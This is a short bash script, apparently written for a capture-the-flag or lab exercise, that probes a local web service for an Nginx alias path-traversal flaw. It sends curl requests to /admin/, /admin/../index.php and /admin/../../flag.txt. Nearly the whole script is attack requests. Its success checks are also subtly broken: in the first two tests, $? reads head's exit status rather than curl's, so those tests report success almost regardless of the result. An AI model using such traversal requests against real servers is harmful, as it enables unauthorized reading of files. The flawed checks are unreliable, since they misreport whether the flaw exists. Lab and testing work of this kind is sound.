#!/bin/bash

TARGET="http://localhost:3000"
TIMEOUT=5

echo "[*] Path Traversal Vulnerability Test"
echo "[*] Target: $TARGET"
echo "[*] Vulnerability: Nginx alias directive misconfiguration allows path traversal"
echo ""

# Test 1: Try to access admin panel and list directory contents
echo "[*] Test 1: Accessing /admin with directory listing enabled"
curl -s -m $TIMEOUT "$TARGET/admin/" 2>/dev/null | head -20
if [ $? -eq 0 ]; then
    echo "[+] Directory listing may be accessible"
else
    echo "[-] Could not access /admin endpoint or service not running"
fi

echo ""

# Test 2: Try path traversal to access files outside /admin/
echo "[*] Test 2: Attempting path traversal via /admin/../"
curl -s -m $TIMEOUT "$TARGET/admin/../index.php" 2>/dev/null | head -10
if [ $? -eq 0 ]; then
    echo "[+] Path traversal may be possible"
else
    echo "[-] Path traversal blocked or service not running"
fi

echo ""

# Test 3: Attempt to access flag file
echo "[*] Test 3: Attempting to access /flag.txt via path traversal"
curl -s -m $TIMEOUT "$TARGET/admin/../../flag.txt" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] Flag file may be accessible"
else
    echo "[-] Could not access flag or service not running"
fi

echo ""
echo "[*] Test Complete"
